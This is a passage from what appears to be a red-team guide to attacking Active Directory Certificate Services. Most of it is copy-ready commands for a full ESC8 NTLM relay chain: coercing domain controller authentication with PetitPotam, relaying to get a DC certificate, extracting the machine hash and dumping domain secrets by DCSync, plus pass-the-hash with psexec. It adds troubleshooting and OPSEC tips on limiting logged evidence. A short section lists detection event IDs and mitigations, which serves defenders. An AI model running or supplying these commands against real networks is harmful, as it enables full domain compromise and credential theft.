psexec.py -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@DC_IP

# Or with TGT
psexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

---

## Full Attack Chain: ESC8 to Domain Admin (NTLM Relay)

A complete relay attack chain requiring network position between victim and CA.

**Prerequisites:**
- Attacker machine on same network segment as domain systems
- HTTP (not HTTPS+EPA) web enrollment on CA
- Ability to coerce DC authentication (PetitPotam, PrinterBug, etc.)

```bash
# Terminal 1: Start relay listener
certipy relay \
  -target http://CA_HOSTNAME/certsrv/ \
  -template DomainController
```

```bash
# Terminal 2: Coerce DC authentication toward attacker
python3 PetitPotam.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  ATTACKER_IP DC_IP
```

```bash
# After relay completes — Terminal 1 shows:
# [*] Saved certificate and key to 'dc_hostname$.pfx'

# Authenticate as DC machine account
certipy auth -pfx 'dc_hostname$.pfx' -dc-ip DC_IP
# Output: DC machine account NTLM hash

# DCSync
secretsdump.py \
  -hashes :DC_MACHINE_NTLM_HASH \
  'TARGET_DOMAIN/DC_HOSTNAME$'@DC_IP
```

---

## Troubleshooting

**"KDC has no support for PKINIT" error:**

```bash
# Use LDAP shell instead of PKINIT
certipy auth -pfx administrator.pfx -dc-ip DC_IP -ldap-shell
```

**Clock skew too great (Kerberos time sync):**

```bash
# Sync system time with DC
sudo ntpdate DC_IP
# Or
sudo timedatectl set-ntp off
sudo date -s "$(curl -sI DC_IP | grep -i date | cut -d' ' -f2-)"
```

**Certificate request denied (manager approval required):**

```bash
# Template has PEND_ALL_REQUESTS flag — ESC4 to modify template, or ESC7 if you have ManageCA
# Check with certipy find — "Requires Manager Approval: True"
```

**"CERTSRV_E_TEMPLATE_DENIED" — not allowed to enroll:**

```bash
# Your user is not in the template's enrollment rights
# Check which groups can enroll:
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP -vulnerable
# Look at "Enrollment Rights" for the target template
```

**PFX is password protected (from ntlmrelayx):**

```bash
# ntlmrelayx sets default password "password" on PFX
certipy auth -pfx administrator.pfx -password password -dc-ip DC_IP

# Convert to unprotected PFX
openssl pkcs12 -in administrator.pfx -out admin_nopass.pfx -nodes -password pass:password
certipy auth -pfx admin_nopass.pfx -dc-ip DC_IP
```

**Certipy find returns no templates:**

```bash
# Try authenticating to a different DC or specifying a target domain
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP -target TARGET_DOMAIN

# Or increase verbosity for debugging
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP -debug
```

**Name resolution issues (DC_HOSTNAME not resolving):**

```bash
# Add DC to /etc/hosts
echo "DC_IP DC_HOSTNAME DC_HOSTNAME.TARGET_DOMAIN" | sudo tee -a /etc/hosts
echo "CA_IP CA_HOSTNAME CA_HOSTNAME.TARGET_DOMAIN" | sudo tee -a /etc/hosts
```

---

## Detection and Defense Notes

Understanding detections helps red teamers operate more carefully and blue teamers build alerts.

**What generates Windows Event Logs:**

- **Event 4886** — Certificate Services received a certificate request
- **Event 4887** — Certificate Services approved a certificate request and issued a certificate
- **Event 4888** — Certificate Services denied a certificate request
- **Event 4899** — A Certificate Services template was updated (ESC4)
- **Event 4900** — Certificate Services template security was updated

**Certipy OPSEC considerations:**

```bash
# Use -debug to see exactly what LDAP queries are made
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP -debug

# Certipy find generates LDAP queries to CN=Certificate Templates — may be logged
# Certificate requests appear in CA event logs regardless of tool used

# For ESC4: restore the template immediately after certificate issuance
# Minimize time window between template modification and restoration
```

**Mitigations (for reference):**

- Enable HTTPS with EPA on web enrollment to prevent ESC8
- Remove `ENROLLEE_SUPPLIES_SUBJECT` from templates where not needed
- Restrict enrollment rights — avoid Domain Users or Authenticated Users
- Enable `Require manager approval` on sensitive templates
- Clear `EDITF_ATTRIBUTESUBJECTALTNAME2` CA flag if set
- Audit CA-level ACLs regularly (ManageCA, ManageCertificates)
- Enable `szOID_NTDS_CA_SECURITY_EXT` extension (requires KB5014754 or newer)
- Monitor Event IDs 4886, 4887, 4899 for anomalous certificate issuance

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
